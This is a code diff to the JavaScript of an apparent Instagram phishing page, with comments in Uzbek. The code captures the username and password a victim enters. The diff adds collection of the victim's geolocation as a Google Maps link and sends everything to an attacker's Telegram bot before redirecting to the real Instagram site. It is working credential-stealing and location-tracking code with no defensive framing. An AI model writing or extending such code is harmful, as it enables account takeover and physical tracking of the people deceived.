@@ -8,21 +8,42 @@ button.addEventListener('click', () => {
     const username = inputs[0].value;
     const password = inputs[1].value;
 
-    const message = `Loxni danniylari\nUsername: ${username}\nPassword: ${password}`;
+    // Foydalanuvchining joylashuvini olish
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const latitude = position.coords.latitude; // Kenglik
+                const longitude = position.coords.longitude; // Uzunlik
 
-    fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-            chat_id: Chat_Id,
-            text: message,
-        }),
-    })
-        .then(response => response.json())
-        .then(res => console.log(res)
-        )
+                // Xabar tarkibi
+                const message = `Loxni danniylari:
+                Username: ${username}
+                Password: ${password}
+                Location: https://www.google.com/maps?q=${latitude},${longitude}`;
 
-    window.location.href = 'https://www.instagram.com/'
+                // Telegramga yuborish
+                fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: Chat_Id,
+                        text: message,
+                    }),
+                })
+                    .then(response => response.json())
+                    .then(res => console.log(res))
+                    .catch(err => console.error(err));
+
+                // Instagramga yo'naltirish
+                window.location.href = 'https://www.instagram.com/';
+            },
+            (error) => {
+                console.error(`Joylashuvni olishda xatolik: ${error.message}`);
+            }
+        );
+    } else {
+        console.error("Geolocation API brauzeringizda qo'llab-quvvatlanmaydi.");
+    }
 });
